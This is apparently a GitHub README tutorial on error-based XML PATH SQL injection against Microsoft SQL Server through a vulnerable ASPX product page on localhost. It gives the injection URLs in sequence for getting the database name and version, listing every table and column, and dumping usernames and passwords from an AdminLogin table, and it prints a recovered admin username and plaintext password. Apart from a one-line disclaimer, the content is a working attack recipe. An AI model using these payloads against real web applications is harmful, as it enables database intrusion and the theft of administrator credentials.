# XML-PATH-Injector

Now let's get started the XML Path Injection in MSSQL server, MsSQL it's Microsoft SQL Server in this post i will use error based injection with malicious interogation for manipulation database and extract administrator credentials. I will use a vulnerable aspx app in localhost for this example. I do not support these illegal activities !

 http://localhost/Product.aspx?Id=13 and 1=db_name()--

Using this simple query we will see the name of the database.

![Screenshot from 2024-01-25 10-31-38](https://github.com/LinuxDestroy/XML-PATH-Injector/assets/26278128/d42f8d12-0fd2-41e6-a6db-3c795ab06f89)

Now the database name is "chemtraders" 
Next step i want to see the DB and OS version for this i will use this query:

http://localhost/Product.aspx?Id=13 and @@version=1--

and output is:

![Screenshot from 2024-01-25 10-34-56](https://github.com/LinuxDestroy/XML-PATH-Injector/assets/26278128/94adade4-c58f-49d4-99df-0dcf67fe0c66)

We see "Microsoft SQL Server 2012 ( SP1 )

Now let's get extract Tables name and Columns from DB with one query:

http://localhost/Product.aspx?Id=13 and 1=(select+table_name%2b'::'%2bcolumn_name as t+from+information_schema.columns FOR XML PATH(''))--

and output is:

![Screenshot from 2024-01-25 10-54-54](https://github.com/LinuxDestroy/XML-PATH-Injector/assets/26278128/3fb8189d-d4c9-4e23-b7b4-f692acc6eb26)

Ok now are interested:

AdminLogin ( Table )
UserName ( Column )
Password ( Column )

Let's get dump from this Columns ( UserName and Password ):

http://localhost/Product.aspx?Id=13 and 1=(select+Password,username+from+AdminLogin FOR XML PATH(''))--

Output is:

![Screenshot from 2024-01-25 11-01-25](https://github.com/LinuxDestroy/XML-PATH-Injector/assets/26278128/7704a537-2f76-4bcf-a1e1-886dd15186d4)


Username: admcheter
Password: bweb@chem#123$tre ( this is plaintext )













